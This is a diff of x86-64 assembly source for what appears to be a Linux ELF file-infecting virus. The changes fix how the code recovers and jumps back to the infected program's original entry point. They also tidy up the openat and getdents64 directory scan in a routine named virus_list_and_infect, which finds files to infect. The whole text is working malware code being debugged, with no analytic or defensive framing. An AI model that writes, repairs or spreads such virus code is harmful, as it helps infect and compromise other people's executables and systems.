@@ -121,13 +121,12 @@ _start:
     mov rsp, rbp
     
     ; Pop original entry point into rax
-    ; (we pushed it right after the callee-saved regs)
-    sub rsp, 48                 ; 6 regs: r15, r14, r13, r12, rbx, (original_entry we pushed)
-    pop rax                     ; get original entry point
+    ; Stack layout from rbp: [saved_rbp][rbx][r12][r13][r14][r15][orig_entry]
+    ; rbp points to saved_rbp, so orig_entry is at rbp-48 (6 items * 8 bytes)
+    mov rax, [rbp - 48]         ; get original entry point we pushed earlier
     
-    ; Restore stack properly for clean state
-    mov rsp, rbp
-    add rsp, 8                  ; pop our rbp frame
+    ; Restore stack properly - just restore to the value at function entry
+    pop rbp                     ; restore original rbp
     
     ; Clear registers to provide clean state (like kernel does)
     xor rdi, rdi
@@ -212,7 +211,7 @@ virus_list_and_infect:
     mov eax, SYS_OPENAT
     mov edi, AT_FDCWD
     mov rsi, r12
-    mov edx, O_RDONLY | 0x10000 ; O_RDONLY | O_DIRECTORY
+    mov edx, O_RDONLY | O_DIRECTORY
     xor r10d, r10d
     syscall
 
@@ -223,7 +222,7 @@ virus_list_and_infect:
 
 .vl_read_loop:
     ; getdents64
-    mov eax, 217                ; SYS_GETDENTS64
+    mov eax, SYS_GETDENTS64
     mov edi, ebx
     lea rsi, [rbp-4224]         ; buffer on stack
     mov edx, 4096
